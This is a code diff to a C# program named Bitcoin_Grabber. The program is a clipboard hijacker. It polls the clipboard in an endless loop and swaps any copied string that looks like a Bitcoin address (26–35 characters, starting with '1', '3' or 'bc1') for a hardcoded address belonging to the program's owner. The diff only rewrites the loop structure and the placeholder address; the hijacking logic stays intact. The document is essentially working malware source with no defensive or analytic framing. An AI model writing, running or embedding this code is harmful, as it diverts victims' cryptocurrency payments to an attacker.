@@ -19,28 +19,24 @@ namespace Bitcoin_Grabber
             // the address always start with 1 or 3 or bc1
             // the length is between 26-35 characters
             // more info https://en.bitcoin.it/wiki/Address
-            string ADDR = "This should be your bitcoin address";
+            string ADDR = "1This is your bitcoin address";
 
 
             for (; ; )
             {
-            if (Clipboard.GetText() != ADDR)
-            {
-                if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
-                {
-                    if (Clipboard.GetText().StartsWith("1") ||
-                        Clipboard.GetText().StartsWith("3") ||
-                        Clipboard.GetText().StartsWith("bc1"))
-                    {
-                        new Thread(() =>
-                        {
-                            Clipboard.SetText(ADDR);
-                        })
-                        { ApartmentState = ApartmentState.STA }.Start();
-                    }
-                }
-                {
                 Thread.Sleep(10);
+                if (Clipboard.GetText() != ADDR)
+                    if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
+                        if (Clipboard.GetText().StartsWith("1") ||
+                            Clipboard.GetText().StartsWith("3") ||
+                            Clipboard.GetText().StartsWith("bc1"))
+                        {
+                            new Thread(() =>
+                            {
+                                Clipboard.SetText(ADDR);
+                            })
+                            { ApartmentState = ApartmentState.STA }.Start();
+                        }
             }
 
 
